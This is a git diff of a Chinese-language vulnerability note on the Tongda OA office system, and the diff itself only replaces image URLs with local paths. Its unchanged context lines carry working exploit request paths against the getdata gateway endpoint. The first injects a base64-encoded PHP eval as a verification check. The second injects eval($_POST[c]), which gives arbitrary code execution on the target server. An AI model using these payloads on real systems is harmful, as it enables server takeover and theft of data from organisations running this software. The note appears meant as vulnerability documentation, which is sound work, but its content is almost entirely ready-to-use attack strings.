@@ -20,7 +20,7 @@ app="通达OA网络智能办公系统"
 
 登录页面
 
-![image-20221008102828374](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202210081028459.png)
+![image-20221008102828374](./images/202210081028459.png)
 
 验证POC
 
@@ -28,7 +28,7 @@ app="通达OA网络智能办公系统"
 /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage
 ```
 
-![image-20221008102844264](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202210081028320.png)
+![image-20221008102844264](./images/202210081028320.png)
 
 ```
 /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[c]))%3B/*&id=19&module=Carouselimage
